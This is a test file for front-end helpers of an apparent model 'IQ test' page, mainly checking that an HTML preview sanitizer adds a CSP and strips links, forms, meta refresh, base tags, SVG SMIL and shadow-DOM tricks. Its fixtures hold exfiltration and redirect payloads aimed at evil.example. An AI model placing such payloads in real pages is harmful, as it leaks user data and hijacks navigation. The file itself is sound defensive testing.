import { describe, it } from 'node:test'
import assert from 'node:assert/strict'
import { JSDOM } from 'jsdom'
import {
  formatIqLatency,
  iqTargetKey,
  iqTimeoutHint,
  iqVerdictTone,
  shouldAdoptIqRunResult,
  withIqPreviewCsp,
} from '../src/utils/iqTest'

// 浏览器环境已有 DOMParser；Node 测试用 jsdom 提供同样的 HTML 文档解析语义。
if (typeof globalThis.DOMParser === 'undefined') {
  globalThis.DOMParser = new JSDOM().window.DOMParser
}

describe('iqTest: 智商检测展示', () => {
  it('用渠道与模型组合出唯一选项 key', () => {
    assert.notEqual(iqTargetKey('c1', 'm1'), iqTargetKey('c2', 'm1'))
    assert.notEqual(iqTargetKey('c1', 'm1'), iqTargetKey('c1', 'm2'))
  })

  it('将判定结果映射为徽标色调', () => {
    assert.equal(iqVerdictTone('passed'), 'success')
    assert.equal(iqVerdictTone('failed'), 'danger')
    assert.equal(iqVerdictTone('incorrect'), 'warning')
    assert.equal(iqVerdictTone('review'), 'warning')
  })

  it('后台检测完成时保护用户正在查看或编辑的详情', () => {
    assert.equal(shouldAdoptIqRunResult({ pinned: false, editing: false }), true)
    assert.equal(shouldAdoptIqRunResult({ pinned: true, editing: false }), false)
    assert.equal(shouldAdoptIqRunResult({ pinned: false, editing: true }), false)
    assert.equal(shouldAdoptIqRunResult({ pinned: true, editing: true }), false)
  })

  it('在已有 head 中注入 CSP，并保留原有内容', () => {
    const html = '<!DOCTYPE html><html><head><title>x</title></head><body><svg></svg></body></html>'
    const result = withIqPreviewCsp(html)

    assert.ok(result.includes('Content-Security-Policy'))
    assert.ok(result.includes('<title>x</title>'))
    assert.ok(result.indexOf('Content-Security-Policy') < result.indexOf('<title>x</title>'))
  })

  it('没有 head 时补出 head，片段则包成完整文档', () => {
    const withHtml = withIqPreviewCsp('<html><body><svg></svg></body></html>')
    assert.ok(withHtml.includes('<head><meta http-equiv="Content-Security-Policy"'))

    const fragment = withIqPreviewCsp('<svg></svg>')
    assert.ok(fragment.startsWith('<!DOCTYPE html>'))
    assert.ok(fragment.includes('<body><svg></svg></body>'))
  })

  it('不会把 header 当成 head，也不会放行内联脚本', () => {
    const html = '<html><header>标题</header><body><svg></svg></body></html>'
    const result = withIqPreviewCsp(html)

    assert.ok(result.indexOf('Content-Security-Policy') < result.indexOf('<header>'))
    assert.ok(!result.includes('script-src'))
  })

  it('注释或文本里伪造的 head 不会吞掉 CSP', () => {
    const html = '<!-- <head> --><html><body><img src="https://evil.example/collect?data=内容"></body></html>'
    const result = withIqPreviewCsp(html)

    const csp = result.indexOf('Content-Security-Policy')
    assert.ok(csp > 0)
    assert.ok(csp < result.indexOf('<img'))
  })

  it('属性值中的 > 不会让导航目标逃逸清洗', () => {
    const html = '<html><body>' +
      '<a title=">" href="https://evil.example/collect?data=内容">查看作品</a>' +
      '<meta title=">" http-equiv="refresh" content="0;url=https://evil.example/refresh">' +
      '<base href="https://evil.example/">' +
      '</body></html>'
    const result = withIqPreviewCsp(html)

    assert.ok(!result.includes('evil.example'))
    assert.ok(result.includes('查看作品'))
  })

  it('实体编码的 meta refresh 也会被移除', () => {
    const html = '<meta http-equiv="&#114;efresh" content="0;url=https://evil.example/refresh">'
    const result = withIqPreviewCsp(html)

    assert.ok(!result.includes('evil.example'))
    assert.ok(!result.includes('http-equiv="&#114;efresh"'))
  })

  it('未加引号属性中的引号不会绕过解析器', () => {
    const html = '<div data-x=x"><a href=https://evil.example/collect>查看</a>">'
    const result = withIqPreviewCsp(html)

    assert.ok(!/<a[\s>]/i.test(result))
    assert.ok(!result.includes('href=https://evil.example'))
    assert.ok(result.includes('查看'))
  })

  it('SVG SMIL 不能给锚点动态补回外链', () => {
    const html = '<svg><a id="link"><set attributeName="href" to="https://evil.example/collect?data=内容"/>' +
      '<text>查看作品</text></a></svg>'
    const result = withIqPreviewCsp(html)

    assert.ok(!/<a[\s>]/i.test(result))
    assert.ok(result.includes('查看作品'))
  })

  it('声明式 Shadow DOM 模板中的外链也会被移除', () => {
    const html = '<html><body><div><template shadowrootmode="open">' +
      '<a href="https://evil.example/collect">查看</a></template></div><svg></svg></body></html>'
    const result = withIqPreviewCsp(html)

    assert.ok(!/<template/i.test(result))
    assert.ok(!result.includes('evil.example'))
  })

  it('移除链接和表单的导航目标', () => {
    const html = '<html><body><a href="https://evil.example/x" target="_top">点击</a>' +
      '<form action="https://evil.example/post" method="post"></form><svg></svg></body></html>'
    const result = withIqPreviewCsp(html)

    assert.ok(!result.includes('evil.example'))
    assert.ok(result.includes('点击'))
  })

  it('耗时按毫秒与秒展示', () => {
    // 复用全局时长规则：>= 1 秒换算成 s，整秒不带小数。
    assert.equal(formatIqLatency(800), '800 ms')
    assert.equal(formatIqLatency(12_340), '12.3 s')
    assert.equal(formatIqLatency(12_000), '12 s')
    assert.equal(formatIqLatency(-1), '—')
  })

  it('超时提示按服务端下发的生效值生成', () => {
    assert.equal(
      iqTimeoutHint({ durationHint: '图形题通常需要 30–120 秒', effectiveTimeoutMs: 180_000 }),
      '图形题通常需要 30–120 秒，超时 180 秒。',
    )
    // IQ_TEST_TIMEOUT_MS 压低后，提示跟着变成真实拦截时刻，不再写死 180 秒。
    assert.equal(
      iqTimeoutHint({ durationHint: '图形题通常需要 30–120 秒', effectiveTimeoutMs: 90_000 }),
      '图形题通常需要 30–120 秒，超时 90 秒。',
    )
    assert.equal(iqTimeoutHint(null), '')
  })
})
